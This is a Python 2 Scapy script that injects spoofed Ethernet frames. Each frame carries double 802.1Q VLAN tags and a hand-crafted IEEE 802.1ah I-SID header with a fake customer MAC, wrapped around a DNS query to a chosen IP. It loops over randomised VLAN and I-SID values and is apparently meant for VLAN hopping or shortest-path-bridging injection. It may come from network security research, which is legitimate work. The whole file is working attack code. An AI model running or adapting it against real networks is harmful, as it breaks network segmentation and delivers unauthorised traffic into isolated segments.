from scapy.all import * 
import binascii
import random
from optparse import OptionParser

parser = OptionParser(usage="usage: %prog [options]", version="%prog 1.0")
parser.add_option("-i", "--ip",
                  dest="ip_addr", type="str")
parser.add_option("-t", "--start",type="int",
                  dest="start")
parser.add_option("-e", "--end",type="int",
                  dest="end")

(options, args) = parser.parse_args()

def print_usage():
    print "[+] Usage:  spb-triple-dotq-random.py --ip <ip> --start <start_range> --end <end_range>"
    print "[+] Example Usage:  spb-triple-dotq-random.py --ip 192.168.1.1 --start 1 --end 6400"
    exit(1)

if not options.ip_addr:
    print "[+] Missing ip address option (--ip <ip>)"
    print_usage()
elif not options.start:
    print "[+] Missing start option (--start <ID>)"
    print_usage()
elif not options.end:
    print "[+] Missing end option (--end <ID>)"
    print_usage()
else:
    pass

if options.start >= options.end:
    print "[-] start must be less than end"
    print_usage()
    exit(1)

print "[+] Spoofing L2 ping, system random with spoofed triple dot1q vlans and i-sid"
print "[+] Using destination IP address: %s" % options.ip_addr
print "[+] Using start range:  %s" % options.start
print "[+] Using end range:  %s" % options.end

start=options.start
end=options.end
dst_ip = options.ip_addr

def int_to_str(i):
    return '%06x'%((i+2**24)%2**24)

for x in range(start,end):
    vlan1 = random.randint(start,end)
    vlan2 = random.randint(start,end)
    my_isid = random.randint(start,end)

    ####
    # construct i-sid bytes
    ####
    ###
    # first 4 bytes of IEEE 802.1ah, representing i-sid
    ###
    tmp_isid_bytes = int_to_str(my_isid)
    byte1 = binascii.unhexlify(tmp_isid_bytes[0:2])
    byte2 = binascii.unhexlify(tmp_isid_bytes[2:4])
    byte3 = binascii.unhexlify(tmp_isid_bytes[4:6])
    ## End of first 4 bytes of IEEE 802.1ah

    i_sid = '\x20' + byte1 + byte2 + byte3
    #c_dest = '\x00\x80\x00\x00\x01\x00'
    ####
    # Hardcode c_dest to be a different one than what is known on the network
    c_dest = '\x00\x88\xab\x96\xc7\xaa'
    c_source = '\x00\x00\x00\x00\x00\x00'
    type = '\x81\x00'
    my_var = i_sid + c_dest + c_source + type 
   
    data = "abcdefghijklmnopqrstuvabcdefghij"
 
    print "[+] Count %d:  Spoofing vlan1 of %d and vlan2 of %d, i-sid of: %d" % (x,vlan1,vlan2,my_isid)
    sendp(Ether()/Dot1Q(vlan=vlan1)/Dot1Q(vlan=vlan1,type=0x88e7)/my_var/Dot1Q(vlan=vlan2)/IP(dst=dst_ip)/UDP()/DNS(rd=1,qd=DNSQR(qname="www.google.com")))

